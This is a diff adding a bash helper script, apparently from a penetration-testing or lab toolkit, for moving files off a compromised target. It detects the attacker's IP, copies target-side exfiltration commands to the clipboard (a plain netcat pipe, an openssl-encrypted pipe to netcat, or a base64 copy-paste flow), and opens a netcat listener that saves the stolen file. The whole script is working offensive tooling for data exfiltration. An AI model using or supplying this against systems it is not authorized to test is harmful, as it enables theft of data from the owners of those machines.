@@ -1,0 +1,113 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+
+# Define colors
+RED="\e[31m"
+GREEN="\e[32m"
+YELLOW="\e[33m"
+BLUE="\e[34m"
+MAGENTA="\e[35m"
+CYAN="\e[36m"
+BOLD_WHITE="\e[1;37m"
+WHITE="\e[37m"
+BRIGHT_WHITE="\e[97m"
+
+RESET="\e[0m"
+
+COLOR=$BRIGHT_WHITE
+
+
+OUTFILE="${1:-}"
+CASE="${2:-nc}"
+ARG3="${3:-}"   # port OR share name depending on mode
+
+if [[ -z "$OUTFILE" ]]; then
+  echo "Usage: $(basename "$0") <outfile> [nc|encrypted|offline] [port_or_share]" >&2
+  echo "Examples:"
+  echo "  $(basename "$0") <file>                # nc on 9001"
+  echo "  $(basename "$0") <file> nc 7777        # nc on 7777"
+  echo "  $(basename "$0") <file> encrypted      # OpenSSL decrypting listener"
+  echo "  $(basename "$0") <file> offline        # show base64 clipboard flow"
+  exit 1
+fi
+
+IP="${attacker:-}"
+
+# 1) try tun0 if not provided
+if [[ -z "$IP" ]]; then
+  IP="$(ip -br addr show dev tun0 2>/dev/null | awk '{print $3}' | cut -d/ -f1)"
+fi
+
+# 2) try default-route source IP (best guess for "machine IP" when bridged/NAT)
+if [[ -z "$IP" ]]; then
+  # ip route get 1.1.1.1 outputs e.g.: "1.1.1.1 via ... src 192.168.1.71 dev eth0"
+  IP="$(ip route get 1.1.1.1 2>/dev/null | awk '{
+    for(i=1;i<=NF;i++) if ($i=="src") { print $(i+1); exit }
+  }')"
+fi
+
+# 3) final fallback: first non-loopback global IPv4 address
+if [[ -z "$IP" ]]; then
+  IP="$(ip -4 -br addr show scope global 2>/dev/null | awk '{print $3}' | cut -d/ -f1 | head -n1)"
+fi
+
+if [[ -z "$IP" ]]; then
+  echo "[-] Could not determine an attacker/machine IP. Export \$attacker, connect VPN (tun0), or ensure an interface has an IPv4 address." >&2
+  exit 1
+fi
+
+
+
+
+echo
+case "$CASE" in
+  nc)
+    PORT="${ARG3:-9001}"
+    if [[ "$PORT" =~ ^[0-9]+$ ]] && (( PORT < 1024 )) && (( EUID != 0 )); then
+      echo "[!] Port ${PORT} requires root. Falling back to 9001."
+      PORT=9001
+    fi
+    echo -e "${MAGENTA}=== NC ==="
+    echo -e "${COLOR}nc ${IP} ${PORT} < ${OUTFILE}${RESET}"
+    echo "nc ${IP} ${PORT} < ${OUTFILE}" | xclip -selection clipboard
+    echo -e "${GREEN}→ helper copied to clipboard"
+    echo
+    echo -e "${YELLOW}[*] On ATTACKER: listening on ${IP}:${PORT} → ${OUTFILE}  (Ctrl-C to stop)"
+    nc -l -v -p "${PORT}" > "${OUTFILE}"
+    ;;
+    
+
+  encrypted)
+      echo -e "${MAGENTA}=== Encrypted ==="
+    PORT="${ARG3:-4444}"
+    if [[ "$PORT" =~ ^[0-9]+$ ]] && (( PORT < 1024 )) && (( EUID != 0 )); then
+      echo "[!] Port ${PORT} requires root. Falling back to 4444."
+      PORT=4444
+    fi
+    echo -e "${COLOR}openssl enc -aes256 -pbkdf2 -in ${OUTFILE}| nc ${IP} ${PORT}"
+    echo
+    echo -e "${YELLOW}[*] On ATTACKER: decrypting listener on ${IP}:${PORT} → ${OUTFILE}  (Ctrl-C to stop)"
+    nc -l -p "${PORT}"
+    ;;
+# | openssl enc -d -aes256 -pbkdf2 > "${OUTFILE}"
+
+ offline)
+    echo -e "=== On TARGET: encode and copy this (single line) ===${COLOR}"
+    echo "base64 ${OUTFILE} | tr -d '\\n'"
+    echo "base64 ${OUTFILE} | tr -d '\\n'" | xclip -selection clipboard
+    echo -e "${GREEN}→ helper copied to clipboard"
+    echo -e ${RESET}
+    echo "Paste base64 now (end with Ctrl-D):"
+
+    B64="$(cat)"
+    printf '%s' "$B64" | base64 -d > "${OUTFILE}"
+    echo "Decoded -> ${OUTFILE}"
+    ;;
+
+
+  *)
+    echo "[-] Unknown case: ${CASE}. Use: nc|encrypted|offline" >&2
+    exit 1
+    ;;
+esac
